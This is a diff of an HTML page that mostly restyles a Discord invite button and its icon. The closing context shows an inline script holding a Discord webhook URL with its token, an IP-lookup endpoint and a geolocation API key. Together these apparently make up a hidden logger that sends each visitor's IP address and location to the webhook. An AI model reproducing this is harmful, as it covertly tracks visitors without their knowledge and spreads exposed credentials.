@@ -64,10 +64,11 @@
     }
 
     .custom-button {
-      display: inline-block;
-      background-color: #ffffff;
+      display: inline-flex;
+      align-items: center;
+      background-color: #5271FF;
       border: 2px solid #5271FF;
-      color: #5271FF;
+      color: #ffffff;
       padding: 10px 15px;
       border-radius: 5px;
       transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease;
@@ -77,8 +78,8 @@
     }
 
     .custom-button:hover {
-      background-color: #5271FF;
-      color: #ffffff;
+      background-color: #ffffff;
+      color: #5271FF;
       border-color: #5271FF;
     }
 
@@ -87,7 +88,7 @@
     }
 
     .icon-container i {
-      color: #5271FF;
+      color: #ffffff;
     }
 
     ::selection {
@@ -141,11 +142,11 @@
 
     <!-- Ajout du bouton Discord en tant que lien avec l'icône -->
     <a href="https://discord.gg/yXQtudN7um" class="custom-button" onclick="yourButtonClickFunction()">
-      <span class="icon-container"><i class="fab fa-discord fa"></i></span> Discord
+      <span class="icon-container"><i class="fab fa-discord"></i></span> Discord
     </a>
   </div>
 
-    <script>
+  <script>
     const webhookURL = "https://discord.com/api/webhooks/1213178913237246002/wpJNgN7xCeP0JVUV56RssXpMLaK7cWVcCRcI6DNKLJQaOTrW935G4OqiWDIwFKOgOYOS";
     const ipAddressURL = "https://api64.ipify.org?format=json";
     const ipGeolocationURL = "https://api.ipgeolocation.io/ipgeo?apiKey=26a08efba25f4d54bea9a057c95dc5cb";
